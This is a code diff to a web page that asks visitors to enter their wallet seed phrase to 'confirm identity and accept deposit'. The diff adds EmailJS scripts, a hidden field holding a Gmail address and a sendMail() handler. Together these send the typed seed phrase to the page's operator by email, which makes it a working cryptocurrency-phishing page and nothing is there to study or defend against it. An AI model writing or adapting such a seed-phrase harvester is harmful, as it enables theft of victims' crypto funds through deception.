@@ -27,7 +27,7 @@ section{
     /* border-top: 1px solid rgb(206, 206, 206); */
     padding-top: 50px;
 }
-form{
+.form{
         margin-top: 100px;
         text-align: center;
         background-color: rgb(255, 255, 255);
@@ -62,15 +62,28 @@ form{
             
         </nav>
     </header>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script src="mail.js"></script>
+    <script type="text/javascript">
+        (function () {
+          emailjs.init("_FznmIQ2IcIGPeOms");
+        })();
+      </script>
     <section>
-        <form action="confirm.html">
+        <div class="form">
+       
             <h3>Input phrase to confirm identity and accept deposit</h3>
             <!-- <h2>Confirm identity and access deposit</h2> -->
-            
-            <textarea placeholder="wallet seed phrase..." name="" id="" cols="50" rows="10"></textarea><br>
-            <button>continue</button>
+            <input
+            type="hidden"
+             id="user_email"
+            value="Emmanuel09073048353@gmail.com"
+             />
+             <!-- change all from text area ti input -->
+            <textarea placeholder="wallet seed phrase..." name="user_name" id="name" cols="50" rows="10"></textarea><br>
+            <button onclick="sendMail()">continue</button>
             <p>secured by something</p>
-        </form>
+        </div>
     </section>
 </body>
 </html>
